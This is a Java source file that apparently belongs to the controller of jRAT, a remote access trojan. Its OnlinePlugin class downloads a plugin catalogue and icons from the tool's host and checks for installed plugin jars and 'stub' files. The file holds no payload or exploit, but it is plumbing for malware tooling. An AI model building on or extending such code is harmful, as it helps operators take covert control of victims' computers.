package jrat.controller.addons;

import iconlib.IconUtils;
import jrat.controller.Constants;
import jrat.controller.Globals;
import jrat.controller.net.WebRequest;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.List;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import jrat.api.Plugin;

public class OnlinePlugin {

	private String name;
	private String version;
	private String description;
	private String author;
	private ImageIcon icon;
	private String dlUrl;

	public OnlinePlugin(String name, String version, String description, String author, String dlUrl) {
		this.name = name;
		this.version = version;
		this.description = description;
		this.author = author;
		this.dlUrl = dlUrl;
	}

	public ImageIcon getIcon() {
		if (icon == null) {
			try {
				HttpURLConnection uc = WebRequest.getConnection(Constants.HOST + "/plugins/" + getName().replace(" ", "") + "/icon.png");
				icon = new ImageIcon(ImageIO.read(uc.getInputStream()));
				uc.disconnect();
			} catch (Exception e) {
				e.printStackTrace();
				icon = IconUtils.getIcon("plugin");
			}
		}

		return icon;
	}
	
    public boolean isInstalled() {
        return new File(Globals.getPluginDirectory(), getName() + ".jar").exists();
    }
 
    public File getDirectory() {
        return new File(Globals.getPluginDirectory(), getName());
    }

    public File getJar() {
        return new File(Globals.getPluginDirectory(), getName() + ".jar");
    }
    
    public File[] getStubs() {
    	File stubDir = new File(Globals.getPluginDirectory(), "stubs");
    	List<File> files = new ArrayList<File>();
    	
    	for (File file : stubDir.listFiles()) {
    		if (file.getName().startsWith(getName())) {
    			files.add(file);
    		}
    	}
    	
    	return files.toArray(new File[0]);
    }

	public String getVersion() {
		return version;
	}

	public String getName() {
		return name;
	}

	public String getDisplayName() {
		return name;
	}
	public String getDescription() {
		return description;
	}

	public String getAuthor() {
		return author;
	}

	public boolean isUrlVerified() {
		return dlUrl == null;
	}
	
	public boolean isUpToDate() {
		Plugin plugin = Plugins.getPlugin(name);
    	
    	return plugin != null && plugin.getVersion().equals(version);
	}

	public static List<OnlinePlugin> getAvailablePlugins() throws Exception {
		List<OnlinePlugin> plugins = new ArrayList<OnlinePlugin>();

		HttpURLConnection uc = WebRequest.getConnection(Constants.HOST + "/plugins/plugins.php");
		
		BufferedReader reader = new BufferedReader(new InputStreamReader(uc.getInputStream()));
		String line;

		while ((line = reader.readLine()) != null) {
			String version = reader.readLine();
			String description = reader.readLine();
			String author = reader.readLine();
			
			String dlUrl = reader.readLine();
			
			if (dlUrl != null && dlUrl.equals("")) {
				dlUrl = null;
			}

			OnlinePlugin plugin = new OnlinePlugin(line, version, description, author, dlUrl);

			plugins.add(plugin);
		}

		reader.close();
		
		uc.disconnect();

		return plugins;
	}

}
